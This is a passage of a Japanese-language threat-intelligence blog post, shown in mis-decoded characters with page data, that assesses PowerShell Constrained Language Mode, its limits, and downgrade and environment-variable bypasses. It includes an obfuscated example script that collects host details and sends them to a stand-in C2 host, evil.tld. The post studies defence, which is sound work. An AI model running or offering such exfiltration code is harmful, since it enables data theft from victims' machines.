è¨±å¯ãããåï¼ä»¥ä¸ã®ãªã¹ããåç§ï¼ã®ToString()ã¡ã½ããã¨.NETã¡ã½ãããå¼ã³åºããã¨ãã§ããããã®ä»ã®ã¡ã½ããã¯å¼ã³åºããã¨ãã§ããªãã\n\n\nåãããããè¨ãã¨ããã¯ã¤ããªã¹ãã«è¼ã£ã¦ããªããã¹ã¦ã®åã¨ãã®ã¡ã½ãã/ãã­ããã£ã®å®è¡ããã­ãã¯ããã¾ããèå¨ã¢ã¯ã¿ã¼ã¯```System.Reflection.Assembly``` / ```System.Convert``` / ```System.Runtime.CompilerServices``` ãªã©ã®ã¯ã©ã¹ã«å°éãããã¨ãã§ããªããªããããå¥ã®PEãä½¿ç¨ããã³ã¼ãã¤ã³ã¸ã§ã¯ã·ã§ã³ããã¡ã¤ã«ã¬ã¹æ»æãã¯ããã«é£ãããªãã¾ãã\n\n![202101-2.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic2.png)\n\n\u003cbr\u003e\n\n### è¤éãªã¹ã¯ãªããã®å®è¡ãç¦æ­¢\n\nä¸è¨ã®å¶éãåããã¨ãæ­£å½ãã¤è¤éãªã¹ã¯ãªãããæ­£ããå®è¡ã§ããªããªãå¯è½æ§ãããã¾ããä¾ãã°ãçµç¹ã§WinFormãWPFï¼Windows Presentation Frameworkï¼ãå©ç¨ããã¹ã¯ãªãããä½¿ç¨ãã¦ããå ´åããããã£ãã¹ã¯ãªãããå¨ãåä½ããªããªãã¾ãã\n\n![202101-3.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic3.png)\n\nãã®çµæãã¢ã¸ã¥ã¼ã«ããã®ãã¯ã¤ããªã¹ãç»é²ã·ã¹ãã ã®å½±é¿ãåãããã¨ã«ãªãã¾ããä½æãããåããã¯ã¤ããªã¹ãã«è¼ã£ã¦ããªãåãå¼ã³åºãã¢ã¸ã¥ã¼ã«ã¯ãæ­£ããèª­ã¿è¾¼ã¾ãã¾ããã\n\n![202101-4.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic4.png)\n\nå¾ã£ã¦ããã®ããªã·ã¼ãã¨ã³ããã¤ã³ãã«ç»é²ãã *å* ã«ã**çµç¹ã®ã¹ã¯ãªããï¼ããã°ï¼ãåç¢ºèªãããã¨** ãéå¸¸ã«éè¦ã§ãã\n\n\u003cbr\u003e\n\n### æç¤ºçãªæ©è½ç»é²ã®å¿è¦æ§\n\nããã©ã«ãã§ã¯ããã®è¨èªã¢ã¼ãã¯ãªãã·ã§ã³æ©è½ã§ãããããã¦ã¼ã¶ã¼ã¯åã»ãã·ã§ã³ã®æåã« ```$ExecutionContext.SessionState.LanguageMode = \"ConstrainedLanguage\"```ãå¼ã³åºãããã·ã¹ãã ç°å¢å¤æ°ã«```__PSLockdownPolicy```ãè¿½å ããå¿è¦ãããã¾ãï¼å®ç¨¼åç°å¢ã§ã¯ **ããªãã§ãã ãã**ã[ä»¥ä¸ã®ã»ã¯ã·ã§ã³ãåç§] (https://teamt5.org/jp/posts/a-deep-dive-into-powershell-s-constrained-language-mode/#beware-of-pslockdownpolicy)ãã©ã¡ããçæ³çã§ã¯ãªãããããããã°ãåä½ãã¹ããã¾ãã¯ä¸è¬çãªãã¹ãç®çã«ã®ã¿ä½¿ç¨ããããã«ãã¦ãã ããã\n\nä»£ããã«ãçµç¹ã®ç®¡çèã¯ãWindows 10+ã®WDACï¼Windows Defender Application Controlï¼ã*ã¾ãã¯* Windows 7+ã®AppLockerãä»ãã¦å°å¥ããå¿è¦ãããã¾ãããã®æ¹æ³ã§å®è£ããå ´åãæ»æèã¯æ¨æºçãªPowerShellã»ãã·ã§ã³ã¸ã®å®å¨ãªã¢ã¯ã»ã¹ãå¾ãåã«ãã¾ãã¯WDACã¾ãã¯AppLockerãåé¿ããªããã°ãªããªããªãã¾ããåå¥ã®ã¨ã³ããã¤ã³ãã¾ãã¯å¤§éã®ã¨ã³ããã¤ã³ãã¸ã®å±éã«é¢ããã¬ã¤ãã©ã¤ã³ã¯ãMicrosoft Docsã«æ²è¼ããã¦ãã[Windowsã®ã¢ããªã±ã¼ã·ã§ã³å¶å¾¡](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control)ã®è¨äºã§ç¢ºèªã§ãã¾ãã\n\u003cbr\u003e\n\n### æ¨æºã®ã³ãã³ãã¬ããã§ã¯ãªãã¹ã¯ãªããã«å¯¾ãã¦å¹æç\n\nåã«å¶ç´ä»ãè¨èªã¢ã¼ããæå¹ã«ããã ãã§ã¯ãPowerShellããããããªã¹ã¯ãè»½æ¸ããã®ã«ååã§ã¯ãªããã¨ãæç¢ºã«ãã¦ããå¿è¦ãããã¾ããã¦ã¼ã¶ã¼ãããä½ãæ¨©éã®è¨èªã¢ã¼ãã«å¶éãããã¨ã§ãã«ã¹ã¿ã .NETã¢ã»ã³ããªãã³ã¼ããå®è¡ã§ããªãããã«ãããã¨ã¯å¯è½ã§ãããçµã¿è¾¼ã¿ã®ã³ãã³ãã¬ããã®ã¿ãä½¿ã£ã¦æªæã®ããã¹ã¯ãªãããä½ãåºãæ»æèãé»æ­¢ãããã¨ã¯ã§ãã¾ãããä¾ãã°ãæ»æèã¯ä¾ç¶ã¨ãã¦ãã³ã³ãã¥ã¼ã¿ã¼ã«é¢ããæå ±ãåéããã¹ã¯ãªãããä½æããæ»æèã®C2ã¹ãã¼ã·ã§ã³ã«éãè¿ãå¯è½æ§ãããã¾ãã\n\nä»¥ä¸ã¯ãã®ä¸ä¾ã§ãConstrained Languageï¼å¶ç´ä»ãè¨èªï¼ã¢ã¼ããæå¹ã«ããPowerShellã»ãã·ã§ã³ã§ãä¾ç¶ã¨ãã¦åé¡ãªãå®è¡ãç¶ãã¾ãã\n\n\n```ps1\nStart-Job -ScriptBlock {\n while($true){\n  # MAC address collection (# MACã¢ãã¬ã¹ãåéãã¾ã)\n  .(\"{1}{3}{2}{0}\" -f 'ariable', 'S', 't-V', 'e') -Name (\"{1}{0}\" -f 'ata', 'd') -Value (.(\"{3}{2}{0}{1}\" -f 'Ada', 'pter', 'Net', 'Get-') | .(\"{1}{0}\" -f 'ect', 'sel') (\"{1}{0}{3}{2}\" -f 'erfac', 'Int', 's', 'eAlia'), (\"{0}{1}{2}\" -f 'MacA', 'd', 'dress') | \u0026(\"{3}{2}{0}{1}\" -f 'r', 'tTo-Json', 'e', 'Conv') -Compress) \u003e $null\n  # OSs + username collection (# OS + ã¦ã¼ã¶ã¼åãåéãã¾ã)\n  .(\"{2}{0}{1}\" -f '-', 'Variable', 'Set') -Name (\"{0}{1}\" -f 'd', 'ata') -Value (${D`ATa} + (.(\"{0}{2}{3}{1}\" -f 'Ge', 'nce', 't-CimInst', 'a') (\"{1}{0}{3}{2}\" -f 'ting', 'Win32_Opera', 'em', 'Syst') | .(\"{0}{1}\" -f 'se', 'lect') (\"{0}{1}\" -f 'na', 'me'), (\"{1}{0}\" -f 'me', 'CSNa') | \u0026(\"{2}{3}{1}{0}{4}\" -f 'o-Js', 'T', 'Conve', 'rt', 'on') -Compress)) \u003e $null\n  # WAN IP collection (# WAN IPãåéãã¾ã)\n  \u0026(\"{0}{1}{2}{3}\" -f 'Set-', 'Vari', 'abl', 'e') -Name (\"{1}{0}\" -f 'ta', 'da') -Value (${D`AtA} + ((.(\"{1}{0}\" -f 'r', 'iw') -useb (\"{1}{0}{2}\" -f 'fig', 'ifcon', '.me') -user (\"{0}{1}\" -f 'cur', 'l')).\"cO`NTe`Nt\")) \u003e $null\n  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult) (# ãã¼ã¿ãä¸æãã¡ã¤ã«ã«ä¿å­ãã¾ãï¼éå¸¸ã¯ãèå¨ã¢ã¯ã¿ã¼ãã¤ã³ã¡ã¢ãªã§è¡ãã¾ãããæ¢å­ã®ã³ãã³ãã¬ããã®ã¿ã«åºã¥ãã¤ã³ã¡ã¢ãªå®è¡ã¯ä¸å¯è½ã¾ãã¯éå¸¸ã«å°é£ã§ãï¼)\n  .(\"{1}{0}{2}\" -f '-Variabl', 'Set', 'e') -Name ('a') -Value (\"$env:temp\\$(New-Guid).txt\")\n  ${Da`Ta} | \u0026(\"{1}{2}{0}\" -f 'le', 'O', 'ut-Fi') ${a}\n  # Compresses the file (# ãã¡ã¤ã«ãå§ç¸®ãã¾ã)\n  \u0026(\"{3}{0}{2}{1}\" -f 'ompr', 'Archive', 'ess-', 'C') -De \"$a.zip\" -Co (\"{0}{1}\" -f 'Op', 'timal') -Lit ${a}\n  # Sends it back to the C2 station (# C2ã¹ãã¼ã·ã§ã³ã«éãè¿ãã¾ã)\n  \u0026(\"{1}{0}\" -f 'r', 'iw') (\"{0}{2}{3}{4}{1}\" -f 'h', '00', 'ttp://evil', '.tld:', '80') -method (\"{1}{0}\" -f 'st', 'po') -body (.(\"{1}{0}{2}\" -f 'Co', 'Get-', 'ntent') -Lit \"$a.zip\") \u003e $null\n  \u0026(\"{2}{1}{0}\" -f 'leep', 't-S', 'Star') -Seconds 2\n  }\n}\n```\n\nããã ãã§ã¯ãªããæ»æèã¯```schtask```ãä½¿ã£ã¦æ°¸ç¶åãéæãããã```shell:startup```ä¸ã«è¿½å ã®ãã¤ã­ã¼ããéç½®ããããããªã©ã®ç®çã§ãå¤é¨ãªã½ã¼ã¹ãå¼ã³åºãå¯è½æ§ãããã¾ããå¶ç´ä»ãè¨èªã¢ã¼ãã¯ãæ¢å­ã®ã»ã¨ãã©ã®ã³ãã³ãã¬ãããæ©è½ããã®ããã­ãã¯ãã **ããã§ã¯ãªã** ãã¨ãè¦ãã¦ããã¦ãã ãããè¨ãæããã¨ãèå¨ã¢ã¯ã¿ã¼ãèªç±ã«ä½¿ãããã®ã¯å¶éãã¾ãããããã©ã³ãã³ãã¬ãããæ¨æºçãªWindowsã¢ããªã±ã¼ã·ã§ã³ãä½¿ç¨ã§ããªãããããã§ã¯ããã¾ããã\n\n\n\u003cbr\u003e\n\n#### ```__PSLockdownPolicy``` ã«æ³¨æ\n\næ¢å­ã®ã³ãã³ãã¬ãããæ»æã«ä½¿ç¨ãããã ãã§ãªããç®¡çèã```__PSLockdownPolicy```ãä½¿ç¨ãã¦è¨èªæ©è½ããæå¹ã ã«ãã¦ããå ´åãæ»æèã¯ç®¡çèæ¨©éãæã¤ãã¨ã§ç°¡åã«è¨èªããªã·ã¼ãå¾©åã§ãã¾ãããã®ç°å¢å¤æ°ãä½¿ã£ã¦ãå®éã«ã©ã®ãããªã¢ã¯ã·ã§ã³ãã§ããã®ããè¦ã¦ã¿ã¾ãã\n\n\n![202101-5.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic5.png)\n\n```wldpNativeMethods.cs``` ãã¡ã¤ã«ã«ãã ```SystemPolicy``` ã¯ã©ã¹ã«ãã©ãçãã¦ããã®ããããã¾ãããã®ç°å¢å¤æ°ãåç§ããæ§ããªè¨è¿°ã®ä¸­ã§ãç®¡çèã¯```__PSLockdownPolicy```å¤æ°ã```4```ã«è¨­å®ããããã«è¦æ±ããã¦ãã¾ããã4ãã¨ããå¤ã¯```WLDP_LOCKDOWN_UMCIENFORCE_FLAG``` å®æ°ãæãã¦ãããããã¯ã¦ã¼ã¶ã¼ã¢ã¼ãã®ã³ã¼ãæ´åæ§ï¼UMCI: User-mode Code Integrityï¼ã®å®æ½ãç¤ºãã¦ãã¾ãã\n\n![202101-6.gif](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic6.gif)\n\nãã®å¼ã³åºãã®è¦ªã¡ã½ããã®ååã¯ ```GetDebugLockdownPolicy``` ã¨ãªã£ã¦ããããã®åä½ãå®ç¨¼åç°å¢åãã®ãã®ã§ã¯ãªãããããã°æ©è½ã§ãããã¨ãæå³ãã¦ãã¾ãã\n\n![202101-7.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic7.png)\n\nãã®çè«ã¯ãWDACã«è©³ããèåãªã»ã­ã¥ãªãã£ç ç©¶èã§ãã [Matt Graeberæ°](https://twitter.com/mattifestation/status/921509830644269062)ã®çºè¨ã«ãã£ã¦ãããã«è£ä»ãããã¦ãã¾ãã ããã«èª¿ã¹ãã¨ããããã®åä½ã«ã¤ãã¦ã¯ãå¶ç´ä»ãè¨èªã¢ã¼ãã«é¢ããPowerShellãã¼ã ããã®å¬å¼ã®[æç¨¿](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)ã§ãè¨åããã¦ãããã¨ãå¤æãã¾ããã\n\n\u003e å¶ç´ä»ãè¨èªãå®è£ããä¸ç°ã¨ãã¦ãPowerShellã«ã¯```__PSLockdownPolicy```ã¨å¼ã°ãããããã°ããã³åä½ãã¹ãç¨ã®ç°å¢å¤æ°ãå«ã¾ãã¦ãã¾ãããã­ã¥ã¡ã³ãã«ãã®å¤æ°ã«é¢ããè¨è¿°ã¯ããã¾ãããããããçºè¦ããäººã®ä¸­ã«ã¯å¼·åã¡ã«ããºã ã ã¨èããäººãããããã§ããããã¯è³¢æã§ã¯ããã¾ããããªããªããæ»æèã¯ããã®ç°å¢å¤æ°ãå®¹æã«å¤æ´ãã¦ãè¨­å®ãé¤å»ãããã¨ãã§ããããã§ããã¾ããã¹ã¯ãªããã®FullLanguageã¢ã¼ããæå¹ã«ãããã¡ã¤ã«å½åè¦åããããConstrained Languageï¼å¶ç´ä»ãè¨èªï¼ãå¹æçã«åé¿ãããã¨ãå¯è½ã§ãã\n\nå¼·èª¿ãã¦ããããã®ã¯ãç®¡çèã¯Constrained Languageï¼å¶ç´ä»ãè¨èªï¼ã¢ã¼ããæå¹ã«ããæ¹æ³ã¨ãã¦ããããã¨ã³ããã¤ã³ãã«å°å¥ãã **ã¹ãã§ã¯ãªã** ãã¨ã§ãã»ã­ã¥ãªãã£æ©è½ã«é¢ããè¨äºãèª­ãéã«ã¯ãç¹ã«æ³¨æããå¿è¦ãããã¾ãã\n\n\u003cbr\u003e\n\n### ã¬ã¬ã·ã¼OSã¨ã®äºææ§\n\nãã®æ©è½ãã¨ã³ããã¤ã³ãã«å±éããåã«èæ®ãã¹ããã1ã¤ã®ç¹ã¯ãã¬ã¬ã·ã¼OSã§ããæ¬æç¨¿ã®åé ­ã§èª¬æããããã«ãConstrained Languageï¼å¶ç´ä»ãè¨èªï¼ã¢ã¼ãã¯PowerShell3.0ä»¥éã§ã®ã¿ä½¿ç¨å¯è½ã§ãããWindows7ã«ã¯ããã©ã«ãã§PowerShell2.0ãä»å±ãã¦ãã¾ãã\n\n![202101-8.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic8.png)\n\nWindows7ãªã©ã®å¤ãã·ã¹ãã ã«WMF 5.1ãã¤ã³ã¹ãã¼ã«ãããã¨ã¯å¯è½ã§ããããããã®ã·ã¹ãã ã«ã¯ã³ã¢ã³ã³ãã¼ãã³ãã«PowerShell 2.0ãæ¡ç¨ããã¦ããå¯è½æ§ãé«ãã*ãã¦ã³ã°ã¬ã¼ãæ»æ* ãåããããç¶æã«ããã¾ãã\n\næ»æèã¯ãæ¨æºã®PowerShell 5.1ã»ãã·ã§ã³ãéå§ããä»£ããã«ã ```PowerShell.exe -Version 2```ãä½¿ç¨ãã¦PowerShell 2.0ã»ãã·ã§ã³ãçæããã ãã§æ»æã§ãã¾ãããã®ãã¼ã¸ã§ã³ã«ã¯```ConstrainedLanguage```ã¢ã¼ããå­å¨ããªããããåç´ã«```FullLanguage```ãä½¿ç¨ãã¦ãã©ã¼ã«ããã¯ãã¾ãã\n\n![202101-9.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic9.png)\n\nããã¯Windows10ã§ã¯ããã»ã©åé¡ã«ãªãã¾ãããWindows10ã§ã¯ãPowerShell 5.1ãããã©ã«ãã§ã·ã¹ãã ã«ä»å±ããã¦ããã2.0ã¯```Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root```ãä½¿ç¨ãããã¨ã§åé¤ã§ãã¾ããåé¤ããå¾ã«ãPowerShell v2ãèµ·åãããã¨ããã¨ãã¨ã©ã¼ã¡ãã»ã¼ã¸ãè¡¨ç¤ºããã¾ãã\n\n```text\nPS C:\\\u003e powershell -v 2\nEncountered a problem reading the registry.  Cannot find registry key SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.\n```\n\n_æ¥æ¬èª_\n\n```text\nPS C:\\\u003e powershell -v 2\nã¬ã¸ã¹ããªã®èª­ã¿åãã«åé¡ãçºçãã¾ããã ã¬ã¸ã¹ããªã­ã¼ãSOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngineããè¦ã¤ããã¾ããããã®ã³ã³ãã¥ã¼ã¿ã¼ã«ã¯Windows PowerShell 2ã¨ã³ã¸ã³ãã¤ã³ã¹ãã¼ã«ããã¦ãã¾ããã\n```\n\n\n\u003cbr\u003e\n\n## ä»®èª¬æ¤å®\n\nãã®ã¢ã¼ããä»®èª¬æ»æã«å¯¾ãã¦ã©ã®ç¨åº¦æå¹ããç¢ºèªããããã«ä»¥ä¸ãè¡ãã¾ãã\n\n- 2021å¹´1æ27æ¥æç¹ã§ãæè¿æåºãããåãã®PowerShellãµã³ãã«ã141ååéãã¾ããã\n  - ãããã®ãµã³ãã«ã¯ç¡å·®å¥ã«é¸æããã¦ãããæä½æ¥­ã§é¸ã°ãããã®ã¯ä¸åããã¾ããï¼```*.ps1```ã¹ã¯ãªããã§ãªãç¡å¹ãªãµã³ãã«ã®é¸å¥ãé¤ãï¼ã\n- ```ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName```ã§ã¹ã¯ãªãããå®è¡ãã¾ããã\n- ãããã®ãµã³ãã«ã¯```ConstrainedLanguage```ã¢ã¼ããæå¹ã«ããã·ã¹ãã ã§å®è¡ãã¾ããã\n- ææ ¼ãã¦ããªãPowerShellã»ãã·ã§ã³ãæã¤Windows 10ï¼ãã«ã19042ï¼ã·ã¹ãã ã§ããããã®ãµã³ãã«ãå®è¡ãã¾ããã\n  - æ»æèã¯ã¾ãæ¨©éãææ ¼ãããªããã°ãªãããã¾ããææ ¼ãããæç¹ã§ããå¤§ããªæ¸å¿µãçºçãããã¨ãããææ ¼ããããã®ã¯ä»åã®ãã¹ãããé¤å¤ããã¦ãã¾ãã\n\n![202101-10.png](https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_pic10.png)\n\n\u003cbr\u003e\n\næ¤å®ã®çµæã¯æ¬¡ã®éãã§ãã\n\n- ```ConstrainedLanguage```ããã­ãã¯ãããã±ã¼ã¹\n  - æ­£ããå®è¡ããããµã³ãã«ã®100%ï¼141/141ï¼ã\n    - TCPã·ã§ã«ã®èµ·åãæ¬¡ã®ã¹ãã¼ã¸ã®ãã¤ã­ã¼ãã®èª­ã¿è¾¼ã¿ãä½¿ç¨å¯è½ãªãã¼ã·ã¹ãã³ã¹ã®ä½æãªã©ãæå³ããç®æ¨ã«å°éãã¦ãã¾ãã\n  - ãµã³ãã«ã®51%ï¼72/141ï¼ãããã¯ã¤ããªã¹ãã«è¼ã£ã¦ããªãåã®ä½æãè©¦ã¿ã¾ããã\n  - ãµã³ãã«ã®50%ï¼71/141ï¼ãããã¯ã¤ããªã¹ãã«è¼ã£ã¦ããªãåã§ã¡ã½ãããå¼ã³åºããã¨ãã¾ããã\n  - ãµã³ãã«ã®26.9%ï¼38/141ï¼ããå¤ããã¯ã¤ããªã¹ãã«è¼ã£ã¦ããªãåã«å¤æãããã¨ãã¾ããã\n  - ãµã³ãã«ã®2.8%ï¼4/141ï¼ãããã¯ã¤ããªã¹ãã«è¼ã£ã¦ããªãåã«ãã­ããã£ãè¨­å®ãããã¨ãã¾ããã\n - ```ConstrainedLanguage```ã®ãã­ãã¯ã«å¤±æããã±ã¼ã¹\n  - ãµã³ãã«ã®0.7%ï¼1/141ï¼ãããã¼ã·ã¹ã¿ã³ã¹ã¨ã³ããªãä½æã§ãã¾ããã\n\n\n\u003cbr\u003e\n\n## çµè«\n\nPowerShellã¯ä»ãææ°ã®Windows OSã«[ä¸å¯æ¬ ãªè¦ç´ ](https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f)ã¨ãªã£ã¦ãããããã·ã¹ãã ç®¡çèã¯PowerShellãçµç¹ã«ãããããªã¹ã¯ãéå°è©ä¾¡ããªãããã«æ³¨æããå¿è¦ãããã¾ãã\n\næ¬è¨äºã§ã¯ã```ConstrainedLanguage```ã®ã¡ãªããã¨ãã¡ãªãããããã¦ä»®æ³æ¤å®ã§ã©ã®ãããªåä½ã«ãªãã®ããç¢ºèªãã¾ãããã¨ã³ã¸ã³æ©è½ãæå¹ã«ãããã¨ã§ãPowerShellãæªç¨ãããªã¹ã¯ã¯å¤§å¹ã«ä½æ¸ãããã¨ãã§ãã¾ãããé©åã«ç»é²ãããã¨ãéè¦ã§ããã¾ãããã®è¨èªããªã·ã¼ãç»é²ããåã«ãã¢ã¸ã¥ã¼ã«ãã¹ã¯ãªããã®å¯ç¨æ§ã®ä½ä¸ãããã®ãã¬ã¼ããªãã«è¦åããã®ãã©ããã«ã¤ãã¦ãæ¤è¨ããå¿è¦ãããã¾ãã\n\n\u003cbr\u003e\n\n\n*ç»åã®ã½ã¼ã¹: [Pexels](https://www.pexels.com/)\n","__typename":"ComponentPostPostContext"}],"publishedAt":"2022-04-05T03:14:29.528Z","publish_date":"2021-02-17T10:00:00.000Z","createdAt":"2021-02-01T17:28:10.609Z","updatedAt":"2024-12-10T06:31:42.687Z","banner_img_url":"","thumb_img_url":"https://uploads.teamt5.org/upload/original/a-deep-dive-into-powershell-s-constrained-language-mode_banner.jpg","post_name":"A Deep Dive into PowerShell's Constrained Language Mode","post_url":"a-deep-dive-into-powershell-s-constrained-language-mode","enable_form":false,"attachment_id":null,"attachment_folder_id":null,"top_order":null,"__typename":"Post","tags":[{"id":"87","name":"PowerShell","createdAt":"2021-02-02T10:30:43.906Z","updatedAt":"2021-02-02T11:54:49.732Z","__typename":"Tag"},{"id":"88","name":"Constrained Language Mode","createdAt":"2021-02-02T11:54:28.919Z","updatedAt":"2021-02-05T10:54:38.296Z","__typename":"Tag"},{"id":"41","name":"cyber threat intelligence","createdAt":"2020-06-19T09:26:13.025Z","updatedAt":"2020-10-14T11:42:12.270Z","__typename":"Tag"},{"id":"124","name":"threat hunting","createdAt":"2022-05-06T08:15:54.413Z","updatedAt":"2022-05-06T08:15:54.413Z","__typename":"Tag"}],"topic":{"id":"1","name":"Technical Analysis","category":"blogs","color":"#64cda2","contents":[{"id":"1","text":"Technical Analysis","locale":"en","__typename":"ComponentTopicsTopicContent"},{"id":"3","text":"æè¡åæ","locale":"tw","__typename":"ComponentTopicsTopicContent"},{"id":"5","text":"æè¡åæ","locale":"jp","__typename":"ComponentTopicsTopicContent"}],"__typename":"Topic"},"author":{"id":"10","email":"CTI@example.com","username":"Cyber Threat Intelligence","__typename":"UsersPermissionsUser"}}]},"preview":null}},"page":"/[lang]/posts/[uid]","query":{"lang":"en","uid":"vulnerability-mikrotik-cve-2021-41987"},"buildId":"XqbxkheTUZP7LNf4QrEFV","isFallback":false,"gsp":true,"appGip":true,"scriptLoader":[]}</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WR86PGC" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript></body></html>